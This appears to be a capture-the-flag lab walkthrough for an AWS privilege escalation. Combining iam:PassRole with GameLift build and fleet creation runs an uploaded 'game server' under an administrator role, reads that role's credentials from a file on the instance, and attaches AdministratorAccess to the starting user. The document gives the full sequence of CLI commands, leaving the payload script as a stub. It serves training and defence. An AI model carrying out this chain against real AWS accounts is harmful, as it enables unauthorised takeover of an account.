# Guided Walkthrough: Privilege Escalation via iam:PassRole + gamelift:CreateBuild + gamelift:CreateFleet

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `gamelift:CreateBuild`, and `gamelift:CreateFleet` permissions can gain administrative access by uploading a malicious "game server" binary to Amazon GameLift and creating a fleet that runs it under an administrative IAM instance role.

Amazon GameLift does not validate that uploaded build content implements any game server protocol. Any executable accepted by the `upload-build` command will run as the game server process on fleet EC2 instances. When combined with `iam:PassRole` and the `SHARED_CREDENTIAL_FILE` credential provider, the attacker causes GameLift to write the admin role's temporary credentials to a predictable file path on the fleet instance — `/local/credentials/credentials` — making them directly readable by the game server process without any AWS SDK involvement.

## The Challenge

You start as `pl-prod-gamelift-001-to-admin-starting-user` — an IAM user with a specific set of permissions: `iam:PassRole` (scoped to the admin role), `gamelift:CreateBuild`, `gamelift:CreateFleet`, and `gamelift:RequestUploadCredentials`. Your goal is to reach effective administrator access in the account.

There is also an IAM role, `pl-prod-gamelift-001-to-admin-admin-role`, with `AdministratorAccess` attached. This role trusts `gamelift.amazonaws.com`, meaning it can be used as a GameLift fleet instance role. The question is: can you weaponize these permissions to make a game server process run arbitrary commands under that admin role?

## Reconnaissance

First, confirm your identity and verify that you do not already have admin access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-gamelift-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — good, you're not admin yet
```

Get the account ID — you will need it to construct the role ARN:

```bash
aws sts get-caller-identity --query 'Account' --output text
# {account_id}
```

At this point you know your permissions. `iam:PassRole` lets you hand a role to a compute service. `gamelift:CreateBuild` lets you upload a "game server" binary. `gamelift:CreateFleet` lets you create an EC2 fleet that runs that binary under a specified instance role. Put them together and you have code execution under whatever role you can pass.

## Exploitation

### Step 1: Prepare the malicious game server build

Create a minimal directory structure that satisfies GameLift's build requirements. The key file is the game server script — it reads the admin role's credentials from the shared credentials file and uses them to attach `AdministratorAccess` to the starting user.

```bash
BUILD_ROOT="/tmp/gamelift-build"
STARTING_USER="pl-prod-gamelift-001-to-admin-starting-user"
mkdir -p "$BUILD_ROOT"

# install.sh runs before the server process starts; keep it minimal
cat > "$BUILD_ROOT/install.sh" << 'INSTALLEOF'
#!/bin/bash
echo "Install complete."
INSTALLEOF
chmod +x "$BUILD_ROOT/install.sh"
```

The game server script reads credentials from `/local/credentials/credentials` (only available when `SHARED_CREDENTIAL_FILE` is used as the credential provider) and calls `iam:AttachUserPolicy`:

```bash
# gameserver.sh — the malicious payload
# Read credentials from the shared file and attach AdministratorAccess to the starting user
```

### Step 2: Upload the build to GameLift

Use `aws gamelift upload-build` to submit the build. This command internally calls `gamelift:CreateBuild` and `gamelift:RequestUploadCredentials` to obtain temporary S3 upload credentials — both permissions are available to the starting user.

```bash
aws gamelift upload-build \
    --name pl-prod-gamelift-001-to-admin-build \
    --operating-system AMAZON_LINUX_2023 \
    --server-sdk-version 5.2.0 \
    --build-root "$BUILD_ROOT" \
    --build-version 1.0.0 \
    --region {region}
# Build.BuildId: build-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

Extract the build ID from the output. Then wait for the build to reach `READY` state:

```bash
aws gamelift describe-build \
    --build-id <build-id> \
    --region {region} \
    --query 'Build.Status' \
    --output text
# READY
```

### Step 3: Create the fleet with admin instance role

This is the privilege escalation vector. Pass the admin role as the fleet's instance role and set `--instance-role-credentials-provider SHARED_CREDENTIAL_FILE`. GameLift will write the role's temporary credentials to `/local/credentials/credentials` on each EC2 instance.

```bash
ADMIN_ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-gamelift-001-to-admin-admin-role"

aws gamelift create-fleet \
    --name pl-prod-gamelift-001-to-admin-fleet \
    --build-id <build-id> \
    --compute-type EC2 \
    --ec2-instance-type c5.large \
    --fleet-type ON_DEMAND \
    --instance-role-arn "$ADMIN_ROLE_ARN" \
    --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
    --runtime-configuration 'ServerProcesses=[{LaunchPath=/local/game/gameserver.sh,ConcurrentExecutions=1}]' \
    --region {region}
# FleetAttributes.FleetId: fleet-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

This call succeeds because you have `iam:PassRole` on the admin role (with the `iam:PassedToService` condition satisfied for `gamelift.amazonaws.com`) and `gamelift:CreateFleet`.

### Step 4: Wait for the fleet to activate and run the exploit

GameLift provisions an EC2 instance, downloads the build, runs `install.sh`, then launches `gameserver.sh`. This typically takes 5-15 minutes. The fleet will eventually enter `ERROR` state because the script does not call GameLift's `InitSDK()` — this is expected and the exploit runs before the initialization timeout kills the process.

Poll the fleet status and check for policy attachment alternately:

```bash
# Check fleet status
aws gamelift describe-fleet-attributes \
    --fleet-ids <fleet-id> \
    --region {region} \
    --query 'FleetAttributes[0].Status' \
    --output text

# Check if AdministratorAccess has been attached
aws iam list-attached-user-policies \
    --user-name pl-prod-gamelift-001-to-admin-starting-user \
    --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
    --output text
```

Once `AdministratorAccess` appears in the attached policies list, the escalation has succeeded.

## Verification

Wait about 15 seconds for IAM policy changes to propagate, then verify using the starting user's credentials:

```bash
aws iam list-users --max-items 3 --output table
# Successfully returns user list — you have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/gamelift-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Service" pattern applied to Amazon GameLift. You took three individually scoped permissions and combined them into a full privilege escalation. `iam:PassRole` let you delegate the admin role to GameLift. `gamelift:CreateBuild` let you define what code runs on fleet instances. `gamelift:CreateFleet` provisioned the EC2 infrastructure and triggered execution under the admin role's credentials.

The `SHARED_CREDENTIAL_FILE` credential provider is the critical detail. Unlike the default `INSTANCE_PROFILE` provider (which requires the game server to use the AWS SDK or IMDS to obtain credentials), `SHARED_CREDENTIAL_FILE` writes credentials to a static file path, making them trivially accessible to any shell script without SDK dependencies.

In real environments this pattern appears when game developers are given broad GameLift permissions to manage fleets and builds, but the IAM roles attached to those fleets are not scoped down — instead they carry `AdministratorAccess` or similarly broad permissions for convenience. An attacker who compromises the developer's credentials can follow exactly this path to full account compromise.
